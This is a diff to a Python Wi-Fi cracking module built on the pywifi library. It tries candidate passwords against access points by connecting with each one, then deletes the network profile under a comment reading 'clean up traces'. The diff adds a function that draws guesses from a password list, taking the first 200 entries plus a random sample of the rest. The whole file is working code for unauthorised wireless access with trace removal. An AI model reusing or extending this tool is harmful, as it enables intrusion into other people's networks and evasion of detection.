@@ -1,9 +1,11 @@
 import time
+import math
+import random
 
 from pywifi import const  # 引用一些定义
 
 __all__ = [
-    'get_aps', 'classify_aps', 'crack_ap'
+    'get_aps', 'classify_aps', 'crack_ap', 'sample_passwords'
 ]
 
 def get_aps(iface, count=None, filtered_ssids=None):
@@ -51,18 +53,46 @@ def crack_ap(iface, profile):
 
     # 网卡断开链接后开始连接测试
     if iface.status() == const.IFACE_DISCONNECTED:
+        try:
+            iface.add_network_profile(profile)
+            iface.connect(profile)
 
-        iface.add_network_profile(profile)
-        iface.connect(profile)
+            # wifi连接时间
+            time.sleep(2)
+            return iface.status() == const.IFACE_CONNECTED
 
-        # wifi连接时间
-        time.sleep(2)
-        flag = iface.status() == const.IFACE_CONNECTED
-
-        # 清理痕迹
-        iface.remove_network_profile(profile)
-
-        return flag
-
+        except:
+            raise
+        finally:
+            # 清理痕迹
+            iface.remove_network_profile(profile)
     else:
         return None
+
+
+def sample_passwords(passwords, stype):
+    """
+    密码本采样类型：
+        0: 完全复制密码本
+        1: 提取前200个密码
+        2: 随机采取sqrt(length)个密码
+        3: 提取前200个密码+随机采取sqrt(remaining_length)个密码
+    """
+    if stype == 1:
+        if len(passwords) < 200:
+            return passwords.copy()
+        else:
+            return passwords[:200]
+    elif stype == 2:
+        return random.sample(passwords, int(math.sqrt(len(passwords))))
+    elif stype == 3:
+        if len(passwords) < 200:  # 起始的200个被认为是具有较高可能性的密码
+            p_passwords = passwords
+            r_passwords = []
+        else:
+            p_passwords = passwords[:200]
+            r_passwords = passwords[200:]
+        return p_passwords + \
+            random.sample(r_passwords, int(math.sqrt(len(r_passwords))))
+    else:
+        return passwords.copy()
